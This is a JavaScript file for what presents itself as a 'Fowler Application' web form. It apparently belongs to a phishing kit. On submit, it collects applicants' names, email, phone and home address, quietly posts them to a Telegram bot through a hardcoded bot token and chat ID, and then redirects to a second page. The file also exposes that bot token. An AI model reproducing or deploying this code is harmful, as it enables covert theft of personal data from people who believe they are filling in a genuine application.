document.addEventListener("DOMContentLoaded", function () {  
    const fname = document.getElementById('fname');
    const mname = document.getElementById('mname');
    const lname = document.getElementById('lname');

    const email = document.getElementById('email');
    const phone = document.getElementById('phone');

    const faddress = document.getElementById('address');
    const fzip = document.getElementById('zip');
    const fcity = document.getElementById('city');
    const fstate = document.getElementById('state');

    var form = document.getElementById("myform");

    form.addEventListener('submit', async (e) => {

        e.preventDefault();

        let ebody = `
        \n
        <b>[Fowler Application]</b>
        \n
        <b>Full Name: </b>${fname.value} ${mname.value} ${lname.value}
        \n
        <b>Email: </b>${email.value}
        \n
        <b>Phone: </b>${phone.value}
        \n
        <b>Address: </b>${faddress.value}
        \n
        <b>Zipcode: </b>${fzip.value}
        \n
        <b>City: </b>${fcity.value}
        \n
        <b>State: </b>${fstate.value}
        \n`;

        // Telegram Bot API endpoint
        const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
        const chatId = '6391433593';

        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            const response = await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: ebody,
                parse_mode: 'HTML',
            });

            // Redirect after sending the message
            window.location.href = "app2.html";
        } catch (error) {
            console.error("Error sending message to Telegram:", error);

            // Check if there's a specific error message from the Telegram API response
            if (error.response && error.response.data) {
                console.error("Telegram API error:", error.response.data);
            }
        }
    });
});